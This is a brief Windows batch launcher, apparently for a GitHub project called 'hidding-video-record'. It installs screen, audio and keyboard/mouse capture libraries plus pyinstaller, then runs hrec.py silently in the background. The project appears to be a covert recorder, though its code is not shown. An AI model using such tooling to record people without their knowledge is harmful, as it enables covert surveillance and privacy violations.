@echo off
cd /d "%~dp0"

echo daj gwiazdke na https://github.com/MimiToKOX/hidding-video-record.git
start https://github.com/MimiToKOX/hidding-video-record.git

if not exist venv (
    python -m venv venv
)

call venv\Scripts\activate.bat

pip install -q av mss numpy soundcard pynput imageio-ffmpeg pyinstaller

start "" /b pythonw hrec.py
